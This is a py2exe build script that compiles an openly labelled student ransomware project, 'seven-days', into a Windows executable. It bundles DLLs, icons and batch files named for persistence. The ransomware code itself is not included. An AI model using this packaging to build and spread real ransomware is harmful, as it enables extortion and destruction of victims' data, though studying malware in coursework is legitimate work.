from distutils.core import setup
from glob import glob
import py2exe, os, sys

__home__ = os.path.expanduser("~")
__root__ = os.path.abspath(os.path.dirname(sys.argv[0]))
__dll__ = __root__+r'\statics\DLL\*.*'
__pictures__ = __root__+r'\statics\pictures'
includes = ['win32com.client']
other_files = [(".", glob(__dll__)),(".",["builds\create_shortcut.bat"]),(".",["builds\persistence2.bat"]),(".",["builds\persistence.bat"]),("statics\pictures",glob(__pictures__+r"\*.*"))]

setup(
    name="seven-days",
	description='Ransomware school project - ESGI',
	author='Nicolas Briand, Anthony Thuilliez, Rudy Noyon, Julien Climent',
	url='gitlab.apolyon.eu',
	zipfile = None,
	data_files=other_files,
	console=[
		dict(
			script = "main.py",
			icon_resources = [(1, __pictures__+r"\ring.ico")],
            dest_base = "seven-days"
			)
	],
	options = {'py2exe': {
        'bundle_files': 2,
        'unbuffered': True,
        'optimize': 2,
        'compressed': True,
        'includes': includes
        }
    }
)
print("Compilation done. Don't be to violent...")
